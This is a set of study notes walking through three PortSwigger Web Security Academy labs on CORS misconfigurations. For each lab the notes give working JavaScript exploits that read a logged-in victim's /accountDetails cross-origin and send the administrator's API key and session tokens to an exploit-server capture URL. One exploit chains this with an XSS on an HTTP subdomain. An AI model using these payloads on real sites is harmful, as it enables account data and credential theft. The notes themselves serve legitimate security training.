---
created: 2026-06-04
aliases:
---

| `#`  | Solved? | Name                                               | Date    | Notes      |
| ---- | ------- | -------------------------------------------------- | ------- | ---------- |
| `1.` | `✓`     | CORS vulnerability with basic origin reflection    | `04.06` |            |
| `2.` | `✓`     | CORS vulnerability with trusted null origin        | `04.06` |            |
| `3.` | `✓`     | CORS vulnerability with trusted insecure protocols | `05.06` | #revision  |



## 1. CORS vulnerability with basic origin reflection

>[!done]

>[!note]+ Lab description
> - [`Lab: CORS vulnerability with basic origin reflection`](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
> - Level: #Apprentice 
> 
> This website has an insecure CORS configuration in that it trusts all origins.
> 
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and see an API key in your profile:

![[images/walkthrough/PortSwigger/CORS/lab1/1.png]]

- In HTTP history, observe the key and other information about the user is fetched using a separate `GET` to `/accountDetails`:

![[images/walkthrough/PortSwigger/CORS/lab1/2.png]]

- The response specifies `Access-Control-Allow-Credentials: true`, which means auth artifacts are preserved in cross-origin requests.
- Send this request to `Repeater` and add a test `Origin` header:

```http 
Origin: example.com
```

![[images/walkthrough/PortSwigger/CORS/lab1/3.png]]

- Observe the value is reflected exactly in the `Access-Control-Allow-Origin` response header. This means the [[SOP]] is, in fact, ineffective, and therefore you can read response using CSRF.
- Go to your exploit server and craft an exploit:

```html
<script>
	var req = new XMLHttpRequest(); 
	
	req.onload = reqListener; 
	req.open('get','https://0a1d0059039d54f580cb1cf000c20092.web-security-academy.net/accountDetails',true); 
	req.withCredentials = true;
	req.send(); 
	
	function reqListener() { 
		location='//exploit-0a27006b038b54bf80af1b5501980021.exploit-server.net/capture?data='+this.responseText; 
	};
</script>
```

![[images/walkthrough/PortSwigger/CORS/lab1/4.png]]

- `Store` then `Deliver exploit to victim`. Go to `Access log` and see a request from the victim:

![[images/walkthrough/PortSwigger/CORS/lab1/5.png]]

- Copy the `data` parameter value and URL-decode:

![[images/walkthrough/PortSwigger/CORS/lab1/6.png]]

```
{%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22eo6xv9VKd81HCCmXUeSdx3nrM8zJI4Lv%22,%20%20%22sessions%22:%20[%20%20%20%20%22xizYtTx99aV7g1lZwU7mnfb2IVYF2r20%22%20%20]}
```

```JSON
{  "username": "administrator",  "email": "",  "apikey": "eo6xv9VKd81HCCmXUeSdx3nrM8zJI4Lv",  "sessions": [    "xizYtTx99aV7g1lZwU7mnfb2IVYF2r20"  ]}
```

- Submit the API key as a solution.

![[images/walkthrough/PortSwigger/CORS/lab1/solved.png]]

Solved!

## 2. CORS vulnerability with trusted null origin

>[!done]

>[!note]+ Lab description
> - [`Lab: CORS vulnerability with trusted null origin`](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
> - Level: #Apprentice 
> 
> This website has an insecure CORS configuration in that it trusts the "null" origin.
> 
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
### Solution


- Log in as `wiener` and see an API key in your profile:


![[images/walkthrough/PortSwigger/CORS/lab2/1.png]]

- In HTTP history, observe the key and other information about the user is fetched using a separate `GET` to `/accountDetails`:

![[images/walkthrough/PortSwigger/CORS/lab2/2.png]]

- The response specifies `Access-Control-Allow-Credentials: true`, which means auth artifacts are preserved in cross-origin requests.
- Send this request to `Repeater` and add a test `Origin` header:

```http 
Origin: example.com
```

![[images/walkthrough/PortSwigger/CORS/lab2/3.png]]

- The request succeeds, however, the `Origin` value is not reflected in an  `Access-Control-Allow-Origin` response header, which means JavaScript on `example.com` can't read it.
- Add `null` instead of `example.com`:

```http
Origin: null
```

![[images/walkthrough/PortSwigger/CORS/lab2/4.png]]

- This time, the value is reflected.3
- Craft an exploit with a sandboxed `iframe`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a5f005e0483f80f8098034d008f00e4.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a0400df0408f86e803a02c0015b00ab.exploit-server.net/capture?data='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

![[images/walkthrough/PortSwigger/CORS/lab2/5.png]]

- `Store` then `Deliver exploit to victim`. Go to `Access log` and see a request from the victim:

![[images/walkthrough/PortSwigger/CORS/lab2/6.png]]


- Copy the `data` parameter value and URL-decode:

![[images/walkthrough/PortSwigger/CORS/lab2/7.png]]

```
%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22TkD1MSL0Xup8aib33KQUpTB9XdPzwYq0%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%22OoMJTIV2fjPj999KP494FPpjeVCqJxPz%22%0A%20%20%5D%0A%7D
```

```JSON
{
  "username": "administrator",
  "email": "",
  "apikey": "TkD1MSL0Xup8aib33KQUpTB9XdPzwYq0",
  "sessions": [
    "OoMJTIV2fjPj999KP494FPpjeVCqJxPz"
  ]
}
```

- Submit the API key as a solution.

![[images/walkthrough/PortSwigger/CORS/lab2/solved.png]]

Solved!


## 3. CORS vulnerability with trusted insecure protocols

>[!attention] Needs #revision. 

>[!done]

>[!note]+ Lab description
> - [`Lab: CORS vulnerability with trusted insecure protocols`](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
> - Level: #Practitioner 
> 
> This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
> 
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener` and see an API key in your profile:

![[images/walkthrough/PortSwigger/CORS/lab3/1.png]]

- The request to `/accountDetails` suggests it might support CORS:

![[images/walkthrough/PortSwigger/CORS/lab3/2.png]]

- Notice that when you check stock of any product, your browser makes a request to a `stock` subdomain:

![[images/walkthrough/PortSwigger/CORS/lab3/3.png]]

- The request is sent over HTTP. The `productId` parameter is vulnerable to XSS:

![[images/walkthrough/PortSwigger/CORS/lab3/4.png]]

- Craft an exploit:

```html
<script>
document.location="http://stock.0ae2006d0475f54980370d39008f0014.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ae2006d0475f54980370d39008f0014.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac800260456f5af80450c90011900d8.exploit-server.net/capture?data='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

- `Store` then `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/CORS/lab3/5.png]]

- Go to `Access log` and capture victim's data:

![[images/walkthrough/PortSwigger/CORS/lab3/6.png]]

- Decode:

```
{%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22jZdOYpE8MN74jESoiw275WBnUwfr5Vx4%22,%20%20%22sessions%22:%20[%20%20%20%20%22BfOyXeY7RD15PhETOdtJCW1u7grzNSG5%22%20%20]}
```

```json
{  "username": "administrator",  "email": "",  "apikey": "jZdOYpE8MN74jESoiw275WBnUwfr5Vx4",  "sessions": [    "BfOyXeY7RD15PhETOdtJCW1u7grzNSG5"  ]}
```

![[images/walkthrough/PortSwigger/CORS/lab3/7.png]]

- Submit the API key as a solution.

![[images/walkthrough/PortSwigger/CORS/lab3/solved.png]]


Solved!